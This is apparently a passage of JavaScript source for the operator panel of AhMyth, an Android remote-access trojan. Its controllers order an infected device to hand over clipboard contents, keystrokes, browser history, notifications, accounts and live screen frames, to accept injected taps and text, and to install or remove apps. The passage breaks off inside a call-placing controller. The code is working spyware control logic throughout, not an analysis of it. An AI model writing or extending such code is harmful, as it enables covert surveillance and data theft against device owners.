//-----------------------Device Info Controller------------------------
app.controller("DeviceInfoCtrl", function ($scope, $rootScope) {
    $DeviceInfoCtrl = $scope;
    $DeviceInfoCtrl.deviceInfo = null;
    var deviceInfo = CONSTANTS.orders.deviceInfo;

    $DeviceInfoCtrl.$on('$destroy', () => {
        socket.removeAllListeners(deviceInfo);
    });

    $DeviceInfoCtrl.getDeviceInfo = () => {
        $rootScope.Log('[→] Fetching device information...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: deviceInfo });
    };

    socket.on(deviceInfo, (data) => {
        $rootScope.Log('[✓] Device information received', CONSTANTS.logStatus.SUCCESS);
        $DeviceInfoCtrl.deviceInfo = data;
        $DeviceInfoCtrl.$apply();
    });

    // Auto-load on init
    $DeviceInfoCtrl.getDeviceInfo();
});

//-----------------------Apps Controller------------------------
app.controller("AppsCtrl", function ($scope, $rootScope) {
    $AppsCtrl = $scope;
    $AppsCtrl.appsList = [];
    $AppsCtrl.load = 'loading';
    var apps = CONSTANTS.orders.apps;

    $AppsCtrl.$on('$destroy', () => {
        socket.removeAllListeners(apps);
    });

    $AppsCtrl.getApps = () => {
        $AppsCtrl.load = 'loading';
        $rootScope.Log('[→] Fetching installed apps...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: apps });
    };

    $AppsCtrl.barLimit = 50;
    $AppsCtrl.increaseLimit = () => {
        $AppsCtrl.barLimit += 50;
    };

    // Install app from file path - with file picker
    $AppsCtrl.installApp = () => {
        const { remote } = require('electron');
        const { dialog } = remote || require('@electron/remote');
        if (!dialog) {
            const apkPath = prompt('Enter APK file path on device:');
            if (!apkPath || apkPath.trim() === '') {
                $rootScope.Log('[✗] No file path provided', CONSTANTS.logStatus.FAIL);
                return;
            }
            $rootScope.Log(`[→] Installing app from: ${apkPath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: apkPath.trim() });
            return;
        }
        
        dialog.showOpenDialog({
            title: 'Select APK file to install on device',
            filters: [
                { name: 'APK files', extensions: ['apk'] },
                { name: 'All files', extensions: ['*'] }
            ],
            properties: ['openFile']
        }).then(result => {
            if (!result.canceled && result.filePaths.length > 0) {
                const filePath = result.filePaths[0];
                $rootScope.Log(`[→] Selected APK: ${filePath}`, CONSTANTS.logStatus.INFO);
                // Note: For remote install, we need to upload the file or provide device path
                // For now, we'll ask for device path after file selection
                const devicePath = prompt(`Enter path on device where APK should be located:\n(Selected: ${filePath})`);
                if (devicePath && devicePath.trim() !== '') {
                    $rootScope.Log(`[→] Installing app from device path: ${devicePath}`, CONSTANTS.logStatus.INFO);
                    socket.emit(ORDER, { order: CONSTANTS.orders.installApp, apkPath: devicePath.trim() });
                }
            }
        }).catch(err => {
            $rootScope.Log(`[✗] File selection cancelled or error: ${err.message}`, CONSTANTS.logStatus.FAIL);
        });
    };

    // Uninstall app by package name
    $AppsCtrl.uninstallApp = (packageName, appName) => {
        if (!packageName || packageName.trim() === '') {
            $rootScope.Log('[✗] Please provide a package name', CONSTANTS.logStatus.FAIL);
            return;
        }
        const confirmMsg = `Are you sure you want to uninstall "${appName || packageName}"?`;
        if (confirm(confirmMsg)) {
            $rootScope.Log(`[→] Uninstalling app: ${packageName}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: CONSTANTS.orders.uninstallApp, packageName: packageName });
        }
    };

    socket.on(apps, (data) => {
        $AppsCtrl.load = '';
        if (data.appsList) {
            $rootScope.Log(`[✓] Apps list received: ${data.appsList.length} apps`, CONSTANTS.logStatus.SUCCESS);
            $AppsCtrl.appsList = data.appsList;
            $AppsCtrl.$apply();
        }
    });

    // Handle install app response
    socket.on(CONSTANTS.orders.installApp, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Installation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $AppsCtrl.$apply();
    });

    // Handle uninstall app response
    socket.on(CONSTANTS.orders.uninstallApp, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
            // Refresh apps list after uninstall
            setTimeout(() => {
                $AppsCtrl.getApps();
            }, 2000);
        } else {
            $rootScope.Log(`[✗] Uninstallation failed: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $AppsCtrl.$apply();
    });

    // Auto-load on init
    $AppsCtrl.getApps();
});

//-----------------------Clipboard Controller------------------------
app.controller("ClipboardCtrl", function ($scope, $rootScope) {
    $ClipboardCtrl = $scope;
    $ClipboardCtrl.clipboardText = '';
    $ClipboardCtrl.isMonitoring = false;
    var clipboard = CONSTANTS.orders.clipboard;

    $ClipboardCtrl.$on('$destroy', () => {
        socket.removeAllListeners(clipboard);
    });

    $ClipboardCtrl.getClipboard = () => {
        $rootScope.Log('[→] Fetching clipboard content...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: clipboard, extra: 'get' });
    };

    $ClipboardCtrl.startMonitoring = () => {
        $ClipboardCtrl.isMonitoring = true;
        $rootScope.Log('[✓] Clipboard monitoring started', CONSTANTS.logStatus.SUCCESS);
        socket.emit(ORDER, { order: clipboard, extra: 'start' });
    };

    $ClipboardCtrl.stopMonitoring = () => {
        $ClipboardCtrl.isMonitoring = false;
        $rootScope.Log('[→] Clipboard monitoring stopped', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: clipboard, extra: 'stop' });
    };

    socket.on(clipboard, (data) => {
        if (data.hasData && data.text) {
            $ClipboardCtrl.clipboardText = data.text;
            if ($ClipboardCtrl.isMonitoring && data.timestamp) {
                $rootScope.Log(`[ℹ] Clipboard changed: ${data.text.substring(0, 50)}...`, CONSTANTS.logStatus.INFO);
            } else {
                $rootScope.Log('[✓] Clipboard content received', CONSTANTS.logStatus.SUCCESS);
            }
            $ClipboardCtrl.$apply();
        } else {
            $ClipboardCtrl.clipboardText = '';
            $rootScope.Log('[ℹ] Clipboard is empty', CONSTANTS.logStatus.INFO);
            $ClipboardCtrl.$apply();
        }
    });

    // Auto-load on init
    $ClipboardCtrl.getClipboard();
});

//-----------------------WiFi Controller------------------------
app.controller("WiFiCtrl", function ($scope, $rootScope) {
    $WiFiCtrl = $scope;
    $WiFiCtrl.wifiInfo = null;
    var wifi = CONSTANTS.orders.wifi;

    $WiFiCtrl.$on('$destroy', () => {
        socket.removeAllListeners(wifi);
    });

    $WiFiCtrl.getWiFiInfo = () => {
        $rootScope.Log('[→] Fetching WiFi information...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifi });
    };

    socket.on(wifi, (data) => {
        if (data.enabled) {
            $rootScope.Log('[✓] WiFi information received', CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log('[⚠] WiFi is disabled on device', CONSTANTS.logStatus.WARNING);
        }
        $WiFiCtrl.wifiInfo = data;
        $WiFiCtrl.$apply();
    });

    // Auto-load on init
    $WiFiCtrl.getWiFiInfo();
});

//-----------------------Screen Controller (screen.html)------------------------
// Remote Desktop / VNC-like Controller with Touch Input
app.controller("ScreenCtrl", function ($scope, $rootScope, $interval, $timeout) {
    $ScreenCtrl = $scope;
    var screen = CONSTANTS.orders.screen || 'x0000sc';
    var input = CONSTANTS.orders.input || 'x0000in';
    
    // State
    $ScreenCtrl.isStreaming = false;
    $ScreenCtrl.isLoading = false;
    $ScreenCtrl.currentFrame = null;
    $ScreenCtrl.screenInfo = { width: 1080, height: 1920 };
    $ScreenCtrl.permissionRequired = false;
    $ScreenCtrl.frameCount = 0;
    $ScreenCtrl.lastFrameSize = 0;
    $ScreenCtrl.actualFps = 0;
    
    // Touch control
    $ScreenCtrl.touchEnabled = true;
    $ScreenCtrl.lastTouchPos = null;
    $ScreenCtrl.inputLog = [];
    $ScreenCtrl.textToSend = '';
    
    // Settings
    $ScreenCtrl.quality = '50';
    $ScreenCtrl.fps = '250'; // ms between frames
    
    var streamInterval = null;
    var canvas = null;
    var ctx = null;
    var fpsCounter = 0;
    var fpsTimer = null;
    var isDragging = false;
    var dragStart = null;
    
    $ScreenCtrl.$on('$destroy', () => {
        socket.removeAllListeners(screen);
        socket.removeAllListeners(input);
        if (streamInterval) $interval.cancel(streamInterval);
        if (fpsTimer) $interval.cancel(fpsTimer);
    });
    
    // Initialize canvas
    function initCanvas() {
        canvas = document.getElementById('screenCanvas');
        if (canvas) {
            ctx = canvas.getContext('2d');
        }
    }
    
    // Get canvas coordinates normalized to screen dimensions
    function getCanvasCoords(event) {
        if (!canvas) return null;
        
        var rect = canvas.getBoundingClientRect();
        var scaleX = canvas.width / rect.width;
        var scaleY = canvas.height / rect.height;
        
        var canvasX = (event.clientX - rect.left) * scaleX;
        var canvasY = (event.clientY - rect.top) * scaleY;
        
        // Normalize to 0-1 range for device screen mapping
        var normX = canvasX / canvas.width;
        var normY = canvasY / canvas.height;
        
        return {
            x: Math.max(0, Math.min(1, normX)),
            y: Math.max(0, Math.min(1, normY)),
            pixelX: Math.round(canvasX),
            pixelY: Math.round(canvasY),
            screenX: event.clientX - rect.left,
            screenY: event.clientY - rect.top
        };
    }
    
    // Show touch indicator
    function showTouchIndicator(x, y) {
        $ScreenCtrl.lastTouchPos = { x: x, y: y };
        $timeout(() => {
            $ScreenCtrl.lastTouchPos = null;
        }, 500);
    }
    
    // Add to input log
    function logInput(action, detail) {
        $ScreenCtrl.inputLog.unshift({ action: action, detail: detail });
        if ($ScreenCtrl.inputLog.length > 10) {
            $ScreenCtrl.inputLog.pop();
        }
    }
    
    // Render frame to canvas
    function renderFrame(base64Image, width, height) {
        if (!canvas || !ctx) {
            initCanvas();
        }
        
        if (!canvas || !ctx) {
            console.error('[AhMyth] Canvas not initialized');
            return;
        }
        
        var img = new Image();
        img.onload = function() {
            canvas.width = width || img.width;
            canvas.height = height || img.height;
            ctx.drawImage(img, 0, 0);
            $ScreenCtrl.currentFrame = base64Image;
            fpsCounter++;
            
            if (!$ScreenCtrl.$$phase) {
                $ScreenCtrl.$apply();
            }
        };
        img.onerror = function(err) {
            console.error('[AhMyth] Failed to load image', err);
        };
        img.src = 'data:image/jpeg;base64,' + base64Image;
    }
    
    // ============ Touch/Input Handlers ============
    
    $ScreenCtrl.handleClick = (event) => {
        if (!$ScreenCtrl.touchEnabled || isDragging) return;
        
        var coords = getCanvasCoords(event);
        if (!coords) return;
        
        showTouchIndicator(coords.screenX, coords.screenY);
        logInput('TAP', `${(coords.x * 100).toFixed(0)}%, ${(coords.y * 100).toFixed(0)}%`);
        
        socket.emit(ORDER, {
            order: input,
            action: 'tap',
            x: coords.x,
            y: coords.y,
            normalized: true
        });
    };
    
    $ScreenCtrl.handleMouseDown = (event) => {
        if (!$ScreenCtrl.touchEnabled) return;
        dragStart = getCanvasCoords(event);
        isDragging = false;
    };
    
    $ScreenCtrl.handleMouseMove = (event) => {
        if (!$ScreenCtrl.touchEnabled || !dragStart) return;
        var coords = getCanvasCoords(event);
        if (!coords) return;
        
        // Check if movement is significant enough to be a drag
        var dx = Math.abs(coords.x - dragStart.x);
        var dy = Math.abs(coords.y - dragStart.y);
        if (dx > 0.02 || dy > 0.02) {
            isDragging = true;
        }
    };
    
    $ScreenCtrl.handleMouseUp = (event) => {
        if (!$ScreenCtrl.touchEnabled) return;
        
        if (isDragging && dragStart) {
            var endCoords = getCanvasCoords(event);
            if (endCoords) {
                logInput('SWIPE', `${(dragStart.x * 100).toFixed(0)}%→${(endCoords.x * 100).toFixed(0)}%`);
                
                socket.emit(ORDER, {
                    order: input,
                    action: 'swipe',
                    startX: dragStart.x,
                    startY: dragStart.y,
                    endX: endCoords.x,
                    endY: endCoords.y,
                    duration: 300,
                    normalized: true
                });
            }
        }
        
        dragStart = null;
        isDragging = false;
    };
    
    $ScreenCtrl.sendKey = (key) => {
        logInput('KEY', key.toUpperCase());
        socket.emit(ORDER, {
            order: input,
            action: 'key',
            key: key
        });
    };
    
    $ScreenCtrl.sendText = () => {
        if (!$ScreenCtrl.textToSend) return;
        
        logInput('TEXT', $ScreenCtrl.textToSend.substring(0, 20) + '...');
        socket.emit(ORDER, {
            order: input,
            action: 'text',
            text: $ScreenCtrl.textToSend
        });
        $ScreenCtrl.textToSend = '';
    };
    
    $ScreenCtrl.handleTextKeypress = (event) => {
        if (event.keyCode === 13) { // Enter
            $ScreenCtrl.sendText();
        }
    };
    
    // ============ Stream Controls ============
    
    $ScreenCtrl.getScreenInfo = () => {
        socket.emit(ORDER, { order: screen, extra: 'info' });
    };
    
    $ScreenCtrl.startStream = () => {
        $ScreenCtrl.isLoading = true;
        $ScreenCtrl.frameCount = 0;
        fpsCounter = 0;
        $rootScope.Log('[→] Starting remote desktop stream...', CONSTANTS.logStatus.INFO);
        
        // Request first frame
        socket.emit(ORDER, { order: screen, extra: 'capture' });
        
        // Set up polling for frames
        streamInterval = $interval(() => {
            if ($ScreenCtrl.isStreaming) {
                socket.emit(ORDER, { order: screen, extra: 'capture' });
            }
        }, parseInt($ScreenCtrl.fps));
        
        // FPS counter
        fpsTimer = $interval(() => {
            $ScreenCtrl.actualFps = fpsCounter;
            fpsCounter = 0;
        }, 1000);
        
        $ScreenCtrl.isStreaming = true;
    };
    
    $ScreenCtrl.stopStream = () => {
        $ScreenCtrl.isStreaming = false;
        $ScreenCtrl.isLoading = false;
        
        if (streamInterval) {
            $interval.cancel(streamInterval);
            streamInterval = null;
        }
        if (fpsTimer) {
            $interval.cancel(fpsTimer);
            fpsTimer = null;
        }
        $ScreenCtrl.actualFps = 0;
        
        $rootScope.Log('[→] Remote desktop stream stopped', CONSTANTS.logStatus.INFO);
    };
    
    $ScreenCtrl.captureFrame = () => {
        $ScreenCtrl.isLoading = true;
        $rootScope.Log('[→] Capturing screen...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: screen, extra: 'capture' });
    };
    
    $ScreenCtrl.refreshScreen = () => {
        socket.emit(ORDER, { order: screen, extra: 'capture' });
    };
    
    $ScreenCtrl.setQuality = () => {
        socket.emit(ORDER, { order: screen, extra: 'setQuality', quality: parseInt($ScreenCtrl.quality) });
    };
    
    $ScreenCtrl.setFps = () => {
        if (streamInterval) {
            $interval.cancel(streamInterval);
            streamInterval = $interval(() => {
                if ($ScreenCtrl.isStreaming) {
                    socket.emit(ORDER, { order: screen, extra: 'capture' });
                }
            }, parseInt($ScreenCtrl.fps));
        }
    };
    
    $ScreenCtrl.requestPermission = () => {
        $rootScope.Log('[→] Requesting screen capture permission on device...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: screen, extra: 'request' });
        
        // Show feedback
        $ScreenCtrl.permissionRequesting = true;
        $timeout(() => {
            $ScreenCtrl.permissionRequesting = false;
        }, 5000);
    };
    
    $ScreenCtrl.saveScreenshot = () => {
        if (!$ScreenCtrl.currentFrame) return;
        
        $rootScope.Log('[→] Saving screenshot...', CONSTANTS.logStatus.INFO);
        
        var base64Data = $ScreenCtrl.currentFrame;
        var filename = 'Screenshot_' + Date.now() + '.jpg';
        var filePath = path.join(downloadsPath, filename);
        
        fs.outputFile(filePath, Buffer.from(base64Data, 'base64'), (err) => {
            if (err) {
                $rootScope.Log('[✗] Failed to save screenshot', CONSTANTS.logStatus.FAIL);
            } else {
                $rootScope.Log(`[✓] Screenshot saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
            }
        });
    };
    
    $ScreenCtrl.openFullscreen = () => {
        if (!$ScreenCtrl.currentFrame) return;
        let win = window.open('', '_blank', 'width=540,height=960');
        win.document.write(`
            <html>
            <head><title>Remote Desktop - Fullscreen</title></head>
            <body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;">
            <img src="data:image/jpeg;base64,${$ScreenCtrl.currentFrame}" style="max-width:100%;max-height:100%;object-fit:contain;">
            </body>
            </html>
        `);
    };
    
    // ============ Socket Handlers ============
    
    socket.on(screen, (data) => {
        $ScreenCtrl.isLoading = false;
        
        if (data.success === false) {
            if (data.permissionRequested) {
                // Permission dialog was shown on device
                $rootScope.Log('[✓] Permission dialog shown on device. User must tap "Start Now"', CONSTANTS.logStatus.SUCCESS);
                $ScreenCtrl.permissionRequired = true;
            } else if (data.error && data.error.toLowerCase().includes('permission')) {
                $ScreenCtrl.permissionRequired = true;
                $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
            } else {
                $rootScope.Log(`[✗] Screen error: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
            }
            
            if ($ScreenCtrl.isStreaming) {
                $ScreenCtrl.stopStream();
            }
        } else if (data.message && data.message.includes('permission')) {
            // Permission request sent successfully
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
            if (data.instruction) {
                $rootScope.Log(`[→] ${data.instruction}`, CONSTANTS.logStatus.INFO);
            }
        } else if (data.image) {
            $ScreenCtrl.frameCount++;
            $ScreenCtrl.lastFrameSize = (data.size / 1024).toFixed(1);
            $ScreenCtrl.permissionRequired = false;
            
            // Update screen info from frame
            if (data.width && data.height) {
                $ScreenCtrl.screenInfo.width = data.width;
                $ScreenCtrl.screenInfo.height = data.height;
            }
            
            renderFrame(data.image, data.width, data.height);
            
            if ($ScreenCtrl.frameCount === 1) {
                $rootScope.Log('[✓] Remote desktop active', CONSTANTS.logStatus.SUCCESS);
            }
        } else if (data.width && data.height && !data.image) {
            $ScreenCtrl.screenInfo = data;
            $rootScope.Log(`[✓] Screen: ${data.width}x${data.height}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.quality) {
            $rootScope.Log(`[✓] Quality: ${data.quality}%`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.isCapturing !== undefined) {
            // Status response
            $rootScope.Log(`[✓] Screen capture status: ${data.isCapturing ? 'Active' : 'Inactive'}`, CONSTANTS.logStatus.INFO);
            if (data.isCapturing) {
                $ScreenCtrl.permissionRequired = false;
            }
        } else {
            console.log('[AhMyth] Received screen data:', data);
        }
        
        if (!$ScreenCtrl.$$phase) {
            $ScreenCtrl.$apply();
        }
    });
    
    socket.on(input, (data) => {
        if (data.success) {
            // Input command succeeded
        } else {
            $rootScope.Log(`[✗] Input failed: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
        }
    });
    
    // Initialize
    setTimeout(() => {
        initCanvas();
        $ScreenCtrl.getScreenInfo();
    }, 100);
});

//-----------------------Keylogger Controller------------------------
app.controller("KeyloggerCtrl", function ($scope, $rootScope) {
    $KeyloggerCtrl = $scope;
    $KeyloggerCtrl.keylogs = [];
    $KeyloggerCtrl.isLoading = false;
    $KeyloggerCtrl.keyloggerEnabled = false;
    $KeyloggerCtrl.keylogCount = 0;
    $KeyloggerCtrl.uniqueApps = [];
    $KeyloggerCtrl.barLimit = 50;
    
    var keylogger = CONSTANTS.orders.keylogger || 'x0000kl';

    $KeyloggerCtrl.$on('$destroy', () => {
        socket.removeAllListeners(keylogger);
    });

    $KeyloggerCtrl.getKeylogs = () => {
        $KeyloggerCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching keylogs...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: keylogger, extra: 'get' });
    };

    $KeyloggerCtrl.clearKeylogs = () => {
        $KeyloggerCtrl.keylogs = [];
        $KeyloggerCtrl.keylogCount = 0;
        $KeyloggerCtrl.uniqueApps = [];
        $rootScope.Log('[→] Clearing keylogs...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: keylogger, extra: 'clear' });
    };

    $KeyloggerCtrl.exportKeylogs = () => {
        if ($KeyloggerCtrl.keylogs.length === 0) return;
        
        var content = "Timestamp,App,Type,Content\n";
        $KeyloggerCtrl.keylogs.forEach(log => {
            content += `${new Date(log.timestamp).toLocaleString()},${log.app},${log.type},"${log.content.replace(/"/g, '""')}"\n`;
        });
        
        var filePath = path.join(downloadsPath, "Keylogs_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export keylogs', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Keylogs exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $KeyloggerCtrl.increaseLimit = () => {
        $KeyloggerCtrl.barLimit += 50;
    };

    $KeyloggerCtrl.getTypeIcon = (type) => {
        switch(type) {
            case 'TEXT': return 'keyboard icon';
            case 'WINDOW': return 'window maximize icon';
            case 'NOTIFICATION': return 'bell icon';
            default: return 'file alternate icon';
        }
    };

    $KeyloggerCtrl.copyLog = (log) => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(log.content);
            $rootScope.Log('[✓] Copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    socket.on(keylogger, (data) => {
        $KeyloggerCtrl.isLoading = false;
        
        if (data.logs) {
            $KeyloggerCtrl.keylogs = data.logs;
            $KeyloggerCtrl.keylogCount = data.logs.length;
            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
            
            // Extract unique apps
            const apps = new Set(data.logs.map(l => l.app));
            $KeyloggerCtrl.uniqueApps = Array.from(apps).sort();
            
            $rootScope.Log(`[✓] Received ${data.logs.length} keylogs`, CONSTANTS.logStatus.SUCCESS);
            $KeyloggerCtrl.$apply();
        } else if (data.status) {
            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
            $KeyloggerCtrl.$apply();
        }
    });

    // Initial load
    $KeyloggerCtrl.getKeylogs();
});

//-----------------------Browser History Controller------------------------
app.controller("BrowserHistoryCtrl", function ($scope, $rootScope) {
    $BrowserCtrl = $scope;
    $BrowserCtrl.history = [];
    $BrowserCtrl.bookmarks = [];
    $BrowserCtrl.searches = [];
    $BrowserCtrl.isLoading = false;
    $BrowserCtrl.activeTab = 'history';
    $BrowserCtrl.barLimit = 50;
    
    var browserHistory = CONSTANTS.orders.browserHistory || 'x0000bh';

    $BrowserCtrl.$on('$destroy', () => {
        socket.removeAllListeners(browserHistory);
    });

    $BrowserCtrl.getHistory = () => {
        $BrowserCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching browser data...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: browserHistory });
    };

    $BrowserCtrl.exportHistory = () => {
        var content = "";
        
        if ($BrowserCtrl.activeTab === 'history') {
            content = "Date,Title,URL,Visits\n";
            $BrowserCtrl.history.forEach(item => {
                content += `${new Date(item.date).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}",${item.visits}\n`;
            });
        } else if ($BrowserCtrl.activeTab === 'bookmarks') {
            content = "Created,Title,URL\n";
            $BrowserCtrl.bookmarks.forEach(item => {
                content += `${new Date(item.created).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}"\n`;
            });
        } else {
            content = "Date,Query\n";
            $BrowserCtrl.searches.forEach(item => {
                content += `${new Date(item.date).toLocaleString()},"${(item.query||'').replace(/"/g, '""')}"\n`;
            });
        }
        
        var filePath = path.join(downloadsPath, "Browser_" + $BrowserCtrl.activeTab + "_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export data', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Data exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $BrowserCtrl.increaseLimit = () => {
        $BrowserCtrl.barLimit += 50;
    };

    socket.on(browserHistory, (data) => {
        $BrowserCtrl.isLoading = false;
        
        if (data.history) {
            $BrowserCtrl.history = data.history;
            $BrowserCtrl.bookmarks = data.bookmarks || [];
            $BrowserCtrl.searches = data.searches || [];
            
            $rootScope.Log(`[✓] Received browser data: ${data.history.length} history items`, CONSTANTS.logStatus.SUCCESS);
            $BrowserCtrl.$apply();
        } else {
            $rootScope.Log('[⚠] No browser data found or permission denied', CONSTANTS.logStatus.WARNING);
        }
    });

    // Initial load
    $BrowserCtrl.getHistory();
});

//-----------------------Notifications Controller------------------------
app.controller("NotificationsCtrl", function ($scope, $rootScope) {
    $NotifCtrl = $scope;
    $NotifCtrl.notifications = [];
    $NotifCtrl.isLoading = false;
    $NotifCtrl.notificationEnabled = false;
    $NotifCtrl.notificationCount = 0;
    $NotifCtrl.uniqueApps = [];
    $NotifCtrl.barLimit = 50;
    
    var notifications = CONSTANTS.orders.notifications || 'x0000nt';

    $NotifCtrl.$on('$destroy', () => {
        socket.removeAllListeners(notifications);
    });

    $NotifCtrl.getNotifications = () => {
        $NotifCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching notifications...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: notifications, extra: 'all' });
    };

    $NotifCtrl.getActiveNotifications = () => {
        $NotifCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching active notifications...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: notifications, extra: 'active' });
    };

    $NotifCtrl.clearNotifications = () => {
        $NotifCtrl.notifications = [];
        $NotifCtrl.notificationCount = 0;
        $rootScope.Log('[→] Clearing notifications...', CONSTANTS.logStatus.INFO);
        // Note: This only clears local view, usually we don't clear on device unless specified
    };

    $NotifCtrl.exportNotifications = () => {
        if ($NotifCtrl.notifications.length === 0) return;
        
        var content = "Timestamp,App,Title,Text,Action\n";
        $NotifCtrl.notifications.forEach(n => {
            content += `${new Date(n.timestamp).toLocaleString()},${n.appName},"${(n.title||'').replace(/"/g, '""')}","${(n.text||'').replace(/"/g, '""')}",${n.action}\n`;
        });
        
        var filePath = path.join(downloadsPath, "Notifications_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export notifications', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Notifications exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $NotifCtrl.increaseLimit = () => {
        $NotifCtrl.barLimit += 50;
    };

    socket.on(notifications, (data) => {
        $NotifCtrl.isLoading = false;
        
        if (data.notifications) {
            $NotifCtrl.notifications = data.notifications;
            $NotifCtrl.notificationCount = data.notifications.length;
            $NotifCtrl.notificationEnabled = data.enabled;
            
            // Extract unique apps
            const apps = new Set(data.notifications.map(n => n.appName));
            $NotifCtrl.uniqueApps = Array.from(apps).sort();
            
            $rootScope.Log(`[✓] Received ${data.notifications.length} notifications`, CONSTANTS.logStatus.SUCCESS);
            $NotifCtrl.$apply();
        } else if (data.status) {
            $NotifCtrl.notificationEnabled = data.enabled;
            $NotifCtrl.$apply();
        }
    });

    // Initial load
    $NotifCtrl.getNotifications();
});

//-----------------------System Info Controller------------------------
app.controller("SystemInfoCtrl", function ($scope, $rootScope) {
    $SysInfoCtrl = $scope;
    $SysInfoCtrl.systemData = null;
    $SysInfoCtrl.isLoading = false;
    $SysInfoCtrl.activeTab = 'battery';
    
    var systemInfo = CONSTANTS.orders.systemInfo || 'x0000si';

    $SysInfoCtrl.$on('$destroy', () => {
        socket.removeAllListeners(systemInfo);
    });

    $SysInfoCtrl.getAllSystemInfo = () => {
        $SysInfoCtrl.isLoading = true;
        $rootScope.Log('[→] Scanning system...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: systemInfo });
    };

    $SysInfoCtrl.formatUptime = (millis) => {
        if (!millis) return '0s';
        const seconds = Math.floor(millis / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        const days = Math.floor(hours / 24);
        
        if (days > 0) return `${days}d ${hours % 24}h`;
        if (hours > 0) return `${hours}h ${minutes % 60}m`;
        return `${minutes}m ${seconds % 60}s`;
    };

    $SysInfoCtrl.formatBytes = (bytes) => {
        if (!bytes || bytes === 0) return '0 B';
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
    };

    $SysInfoCtrl.formatTime = (millis) => {
        if (!millis) return '0s';
        const seconds = Math.floor(millis / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        
        if (hours > 0) return `${hours}h ${minutes % 60}m`;
        return `${minutes}m ${seconds % 60}s`;
    };

    $SysInfoCtrl.getBatteryClass = (level) => {
        if (level <= 15) return 'battery-low';
        if (level <= 40) return 'battery-medium';
        return 'battery-high';
    };

    $SysInfoCtrl.getAccountIcon = (type) => {
        if (type.includes('google')) return 'google icon';
        if (type.includes('facebook')) return 'facebook icon';
        if (type.includes('twitter')) return 'twitter icon';
        if (type.includes('whatsapp')) return 'whatsapp icon';
        if (type.includes('telegram')) return 'telegram icon';
        return 'user circle icon';
    };

    $SysInfoCtrl.getImportanceClass = (importance) => {
        if (importance === 'Foreground') return 'badge--success';
        if (importance === 'Visible') return 'badge--info';
        return 'badge--default';
    };

    socket.on(systemInfo, (data) => {
        $SysInfoCtrl.isLoading = false;
        $SysInfoCtrl.systemData = data;
        $rootScope.Log('[✓] System analysis complete', CONSTANTS.logStatus.SUCCESS);
        $SysInfoCtrl.$apply();
    });

    // Initial load
    $SysInfoCtrl.getAllSystemInfo();
});

//-----------------------Make Call Controller------------------------
app.controller("MakeCallCtrl", function ($scope, $rootScope) {
    $MakeCallCtrl = $scope;
    $MakeCallCtrl.phoneNumber = '';
    $MakeCallCtrl.callHistory = [];
    
    var makeCall = CONSTANTS.orders.makeCall || 'x0000mc2';

    $MakeCallCtrl.$on('$destroy', () => {
        socket.removeAllListeners(makeCall);
    });

    $MakeCallCtrl.makeCall = () => {
        if (!$MakeCallCtrl.phoneNumber) {
            $rootScope.Log('[✗] Please enter a phone number', CONSTANTS.logStatus.FAIL);
            return;
        }
        
